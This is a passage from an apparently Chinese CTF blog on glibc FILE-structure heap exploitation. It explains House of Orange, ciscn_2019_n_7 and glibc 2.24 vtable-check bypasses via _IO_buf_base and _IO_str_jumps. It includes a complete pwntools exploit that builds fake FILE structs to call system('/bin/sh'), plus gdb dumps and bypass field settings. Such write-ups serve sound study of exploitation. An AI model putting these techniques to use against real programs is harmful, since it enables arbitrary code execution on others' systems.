pay.ljust(0x100,&apos;\0&apos;)</span><br><span class="line">pay += p64(buf_addr)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#sh.recv()</span><br><span class="line">#sh.sendline(&apos;3&apos;)</span><br><span class="line">#exits()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><h3 id="方向-1"><a href="#方向-1" class="headerlink" title="方向"></a>方向</h3><p>就是演示代码的实际利用。</p>
<p>malloc_printerr 会调用_io_overflow<br>伪造被放入unsorted bin中的top chunk为FILE 结构体，使之能够绕过检查进入_IO_OVERFLOW (fp, EOF)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)  //需要bypass的条件</span><br><span class="line">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">	   || (_IO_vtable_offset (fp) == 0</span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))                        </span><br><span class="line">#endif</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)                              //改 _IO_OVERFLOW 为 system 劫持程序流！</span><br><span class="line">	result = EOF;</span><br></pre></td></tr></table></figure>
<p>即需要满足任意一种<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.fp-&gt;_mode &lt;= 0</span><br><span class="line">2.fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">或</span><br><span class="line">1._IO_vtable_offset (fp) == 0</span><br><span class="line">2.fp-&gt;_mode &gt; 0</span><br><span class="line">3.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></p>
<h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>house of orange 的开山之作，因而之后这种利用方法就叫做house of orange<br>题目可以 build ,upgrade ,see<br>build 会创建三个chunk，一个保存其中两个的指针，一个保存大小与颜色，最后为用户自定义大小不大于0x1000的chunk。<br>upgrade 时没有考虑build时的大小，所以会直接溢出<br>see 正常展示，后面会用来泄露</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>没有free，就要创造free的条件，利用溢出修改top chunk头，使得再次申请时因为top chunk大小不够而将其free掉。</p>
<p>后面申请largebin 大小的chunk使之从中分割来泄露libc 及 heap地址</p>
<p>利用unsorted bin attack 将_IO_list_all修改为main_arena+0x58，同时old top chunk 会被分入small bin中</p>
<p>再分配chunk 触发malloc_printerr遍历_IO_list_all调用_IO_OVERFLOW函数触发伪造的FILE结构体中指针指向的system</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">	local = 0</span><br><span class="line">else:</span><br><span class="line">	local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">	sh = process(&apos;./houseoforange&apos;)</span><br><span class="line">	elf = ELF(&apos;./houseoforange&apos;)</span><br><span class="line">	libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">	sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">	elf = ELF(&apos;./houseoforange&apos;)</span><br><span class="line">	#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line">def build(size,name,price,color):</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.send(name)</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.sendline(str(price))</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def see():</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line"></span><br><span class="line">def upgrade(size,name,price,color):</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.sendline(&quot;3&quot;)</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.send(name)</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.sendline(str(price))</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">build(0x20,&apos;1&apos;,20,1)</span><br><span class="line">pay = &apos;a&apos;*0x20+p64(0)+p64(0x21)+&apos;b&apos;*0x10+p64(0)+p64(0xf91)</span><br><span class="line">upgrade(len(pay),pay,20,1)</span><br><span class="line"></span><br><span class="line">#trigger _sys_malloc</span><br><span class="line">build(0x1000,&apos;2&apos;,20,2)</span><br><span class="line"></span><br><span class="line">build(0x400,&apos;3&apos;*8,20,3)</span><br><span class="line">see()</span><br><span class="line">sh.recvuntil(&apos;3&apos;*8)</span><br><span class="line">libc.base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\0&apos;))-0x3c5188</span><br><span class="line">print hex(libc.base)</span><br><span class="line">io_list_all = libc.base + libc.symbols[&apos;_IO_list_all&apos;]</span><br><span class="line">print hex(io_list_all)</span><br><span class="line">system = libc.base + libc.symbols[&apos;system&apos;]</span><br><span class="line">print hex(system)</span><br><span class="line"></span><br><span class="line">upgrade(0x400,&apos;4&apos;*16,20,4)</span><br><span class="line">see()</span><br><span class="line">sh.recvuntil(&apos;4&apos;*16)</span><br><span class="line">heap_base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\0&apos;))-0xd0</span><br><span class="line">print hex(heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = &apos;e&apos;*0x400</span><br><span class="line">pay += p64(0)+p64(0x21)+p32(1)+p32(0x14)+p64(0)</span><br><span class="line"></span><br><span class="line"># mode &gt;0 &amp;&amp; wide_data-&gt;write_ptr &gt; wide_data-&gt;write_base &amp;&amp; vtable_offset == 0</span><br><span class="line">fake_file = &apos;/bin/sh\x00&apos;+p64(0x61)</span><br><span class="line">fake_file += p64(0xdeadbeef) + p64(io_list_all-0x10) #unsorted bin attack</span><br><span class="line">fake_file = fake_file.ljust(0xa0,&apos;\x00&apos;)</span><br><span class="line">fake_file += p64(heap_base+0x4e0)  #wide_data</span><br><span class="line">fake_file = fake_file.ljust(0xc0,&apos;\x00&apos;)</span><br><span class="line">fake_file += p64(1)  # mode</span><br><span class="line"></span><br><span class="line"># write_base &lt; write_ptr &amp;&amp; mode &lt;=0    </span><br><span class="line">fake_file2 = &apos;/bin/sh\x00&apos;+p64(0x61)</span><br><span class="line">fake_file2 += p64(0xdeadbeef) + p64(io_list_all-0x10)</span><br><span class="line">fake_file2 += p64(0) + p64(1)  # write_base &amp; write_ptr</span><br><span class="line">fake_file2 = fake_file2.ljust(0xc0,&apos;\x00&apos;)</span><br><span class="line">fake_file2 += p64(0)  # mode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay += fake_file         # fake_file &amp; fake_file2 对应着两种绕过检查</span><br><span class="line">pay += p64(0) + p64(0)  </span><br><span class="line">pay += p64(heap_base+0x610) #vtable</span><br><span class="line">pay += p64(0)*2+p64(system)*10</span><br><span class="line"></span><br><span class="line">upgrade(0x800,pay,20,5)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li><p>mode &gt;0 &amp;&amp; wide_data-&gt;write_ptr &gt; wide_data-&gt;write_base &amp;&amp; vtable_offset == 0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&gt; p *(struct _IO_FILE_plus *) 0x55b527f0b500</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, </span><br><span class="line">    _IO_read_end = 0xdeadbeef &lt;error: Cannot access memory at address 0xdeadbeef&gt;, </span><br><span class="line">    _IO_read_base = 0x7fa084964510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x0, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x55b527f0b4e0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x55b527f0b610</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>write_base &lt; write_ptr &amp;&amp; mode &lt;=0    </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&gt; p *(struct _IO_FILE_plus *) 0x55731d86f500 </span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, </span><br><span class="line">    _IO_read_end = 0xdeadbeef &lt;error: Cannot access memory at address 0xdeadbeef&gt;, </span><br><span class="line">    _IO_read_base = 0x7fbcf865f510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x55731d86f610</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="ciscn-2019-n-7"><a href="#ciscn-2019-n-7" class="headerlink" title="ciscn_2019_n_7"></a>ciscn_2019_n_7</h2><p>华北赛区的一道半决赛题</p>
<h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>三个功能 add edit show<br>add只能使用一次，会将name 和 指针保存在堆中，且获取name的时候会有八个字节的溢出，刚好可以覆盖指针，<br>edit会先修改name ，再根据保存的指针来修改内存值，所以可以任意地址写<br>另：输入666可以得到puts的实际地址，因此可以泄露libc</p>
<h3 id="方向-2"><a href="#方向-2" class="headerlink" title="方向"></a>方向</h3><p>666 泄露libc，add或edit来修改指针，原计划修改malloc_hook为onegadget，但是鉴于在add之后不再有malloc 或者free，因此不可行。<br>很自然的想到修改IO_file 虚表来使程序退出时能够触发来getshell。</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="2-24-check-绕过"><a href="#2-24-check-绕过" class="headerlink" title="2.24 check 绕过"></a>2.24 check 绕过</h1><p>前面已经知道从2.24开始添加了对虚表的检查，使得没有办法任意地址伪造vtable。所以有了一些不用伪造虚表的利用办法</p>
<h2 id="IO-buf-base-amp-IO-buf-end"><a href="#IO-buf-base-amp-IO-buf-end" class="headerlink" title="_IO_buf_base &amp; _IO_buf_end"></a>_IO_buf_base &amp; _IO_buf_end</h2><p>再调用相关stdin的函数如——read , scanf等函数时，会对__IO_stdin 的 _IO_buf_base ,_IO_buf_end, _IO_read_ptr, _IO_read_base, _IO_read_end 进行初始化，因为底层调用的malloc，所以一般都会分配到堆里。</p>
<p>可以随便写个小程序测试下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	char *ptr = malloc(0x20);</span><br><span class="line">	int a;</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;a);</span><br><span class="line">	printf(&quot;%d&quot;,a);</span><br><span class="line">	free(ptr);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>加上调试符号编译，scanf过后，可以看到堆中添加了一个大小为0x411的chunk，这个chunk就是开辟的缓冲区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 49, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602030 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 1041, </span><br><span class="line">  fd = 0xa363534333231, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602440 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 134081, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; p *(struct _IO_FILE_plus *) stdin</span><br><span class="line">$3 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539512, </span><br><span class="line">    _IO_read_ptr = 0x602046 &quot;\n&quot;, </span><br><span class="line">    _IO_read_end = 0x602047 &quot;&quot;, </span><br><span class="line">    _IO_read_base = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_write_base = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_write_end = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x602440 &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = -1, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x7ffff7dd7770 &lt;_IO_stdfile_0_lock&gt;, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7ffff7dd59a0 &lt;_IO_wide_data_0&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd2440 &lt;__GI__IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例如我们在使用scanf对栈中的临时变量赋值时，作为缓冲区，数据也会在这边被同步保存，因而如果能够控制_IO_buf_base指针，就能够实现任意地址写。</p>
<p>同理printf等也会开辟输出缓冲区，通过修改也能够做到任意地址读。</p>
<h2 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="_IO_str_jumps"></a>_IO_str_jumps</h2><p>libc不止有_IO_file_jumps这个虚表，还有_IO_str_jumps 与 _IO_wstr_jumps等虚表，一般前者更好利用<br>所以将伪造的结构体vtable指针指向这个虚表，再对其进行利用</p>
<p>_IO_str_jumps 定义于/libio/strops.c中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">const struct _IO_jump_t _IO_str_jumps libio_vtable =</span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>一般可以利用_IO_str_finish 与 _IO_str_overflow，同时也是前者更方便利用，定义如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_str_finish (FILE *fp, int dummy)</span><br><span class="line">&#123;</span><br><span class="line">  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); # call qword ptr [fp+0E8h]</span><br><span class="line">  fp-&gt;_IO_buf_base = NULL;</span><br><span class="line">  _IO_default_finish (fp, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>_IO_str_finish需要满足<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_flags = (binsh_in_libc + 0x10) &amp; ~1</span><br><span class="line">_IO_buf_base = binsh_addr</span><br><span class="line">_freeres_list = 0x2</span><br><span class="line">_freeres_buf = 0x3</span><br><span class="line">_mode = -1</span><br><span class="line">vtable = _IO_str_finish - 0x18</span><br><span class="line">fp+0xe8 -&gt; system_addr</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 